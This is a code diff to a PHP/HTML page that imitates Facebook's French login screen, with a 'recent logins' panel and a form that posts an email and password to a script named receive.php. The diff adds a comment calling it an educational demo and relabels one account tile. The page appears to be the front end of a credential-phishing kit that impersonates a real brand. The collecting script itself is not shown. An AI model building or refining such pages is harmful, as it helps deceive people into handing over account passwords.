@@ -1,4 +1,7 @@
-
+<?php
+// Landing page (demo) with a faux login layout.
+// Educational use only — do not use real credentials.
+?>
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -9,16 +12,14 @@
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline';" />
 </head>
 <body>
-
-
   <div class="container">
     <div class="left">
       <div class="brand">Facebook</div>
       <h2>Connexions récentes</h2>
       <div class="recent">
         <div class="card tile">
-          <div class="avatar">+</div>
-          <div class="name">Ajouter un compte</div>
+          <div class="avatar">U</div>
+          <div class="name">Utilisateur démo</div>
         </div>
         <div class="card tile">
           <div class="avatar">+</div>
@@ -31,7 +32,7 @@
       <div class="card login">
         <form method="post" action="receive.php" class="box">
           <div class="field">
-            <input class="input" name="email" type="text" autocomplete="off" placeholder="Adresse e‑mail ou numéro" required />
+            <input class="input" name="email" type="text" autocomplete="off" placeholder="Adresse e-mail ou numéro" required />
           </div>
           <div class="field">
             <input class="input" name="password" type="password" autocomplete="off" placeholder="Mot de passe" required />
